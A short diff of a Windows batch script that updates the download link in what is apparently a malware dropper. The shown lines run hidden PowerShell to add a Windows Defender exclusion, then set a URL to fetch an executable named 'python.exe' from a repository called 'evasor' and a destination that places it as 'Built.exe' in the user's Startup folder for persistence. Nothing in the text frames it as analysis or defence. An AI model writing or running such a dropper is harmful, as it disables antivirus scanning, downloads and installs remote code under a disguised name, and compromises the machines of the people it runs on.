@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://github.com/WALTER7979/evasor/raw/main/python.exe"
+set "URL=https://github.com/WALTER7979/evasor/releases/download/evasion/python.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
